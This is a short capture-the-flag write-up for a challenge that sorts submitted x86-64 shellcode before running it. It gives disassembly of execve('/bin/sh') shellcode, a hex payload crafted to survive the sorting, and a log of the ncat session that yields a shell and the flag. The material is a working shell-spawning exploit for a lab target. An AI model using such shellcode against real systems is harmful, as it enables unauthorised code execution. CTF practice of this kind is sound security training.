# debug
```
[*] Here is your shellcode before, ugly and unaesthetic ಠ_ಠ
   0:   6a 68                   push   0x68
   2:   48 b8 2f 62 69 6e 2f 2f 2f 73   movabs rax, 0x732f2f2f6e69622f
   c:   50                      push   rax
   d:   48 89 e7                mov    rdi, rsp
  10:   68 72 69 01 01          push   0x1016972
  15:   81 34 24 01 01 01 01    xor    DWORD PTR [rsp], 0x1010101
  1c:   31 f6                   xor    esi, esi
  1e:   56                      push   rsi
  1f:   6a 08                   push   0x8
  21:   5e                      pop    rsi
  22:   48 01 e6                add    rsi, rsp
  25:   56                      push   rsi
  26:   48 89 e6                mov    rsi, rsp
  29:   31 d2                   xor    edx, edx
  2b:   6a 3b                   push   0x3b
  2d:   58                      pop    rax
  2e:   0f 05                   syscall
[*] Here it is after, literally perfect (●'◡'●)
   0:   48 01 e6                add    rsi, rsp
   3:   48 89 e7                mov    rdi, rsp
   6:   48 89 e6                mov    rsi, rsp
   9:   48 b8 2f 62 69 6e 2f 2f 2f 73   movabs rax, 0x732f2f2f6e69622f
  13:   5e                      pop    rsi
  14:   58                      pop    rax
  15:   6a 68                   push   0x68
  17:   50                      push   rax
  18:   68 72 69 01 01          push   0x1016972
  1d:   56                      push   rsi
  1e:   6a 08                   push   0x8
  20:   56                      push   rsi
  21:   6a 3b                   push   0x3b
  23:   0f 05                   syscall
  25:   81 34 24 01 01 01 01    xor    DWORD PTR [rsp], 0x1010101
  2c:   31 f6                   xor    esi, esi
  2e:   31 d2                   xor    edx, edx
```


# getshell
```
(pip_venv) ➜  alpha ncat --ssl 257459cd-2863-45b9-affc-c32464bef0f6.chall.nnsc.tf 41337
>> c704242f62696ec74424042f7368004889e7b83b000000be00000000ba000000000f05
[*] Here is your shellcode before, ugly and unaesthetic ಠ_ಠ
   0:   c7 04 24 2f 62 69 6e    mov    DWORD PTR [rsp], 0x6e69622f
   7:   c7 44 24 04 2f 73 68 00         mov    DWORD PTR [rsp+0x4], 0x68732f
   f:   48 89 e7                mov    rdi, rsp
  12:   b8 3b 00 00 00          mov    eax, 0x3b
  17:   be 00 00 00 00          mov    esi, 0x0
  1c:   ba 00 00 00 00          mov    edx, 0x0
  21:   0f 05                   syscall
[*] Here it is after, literally perfect (●'◡'●)

   0:   c7 04 24 2f 62 69 6e    mov    DWORD PTR [rsp], 0x6e69622f
   7:   c7 44 24 04 2f 73 68 00         mov    DWORD PTR [rsp+0x4], 0x68732f
   f:   48 89 e7                mov    rdi, rsp
  12:   b8 3b 00 00 00          mov    eax, 0x3b
  17:   be 00 00 00 00          mov    esi, 0x0
  1c:   ba 00 00 00 00          mov    edx, 0x0
  21:   0f 05                   syscall
[*] As a special prize, I'll even run it!
[x] Starting local process '/tmp/pwn-asm-a979gzu6/step3-elf'
[+] Starting local process '/tmp/pwn-asm-a979gzu6/step3-elf': pid 48
[*] Switching to interactive mode
# # cat f*
NNS{sh0uld_h4ve_impl3m3nt3d_b0g0sort_inst34d_6d8d4105d42c}
#
```
![](https://r2.20161023.xyz/pic/20250830154824365.png)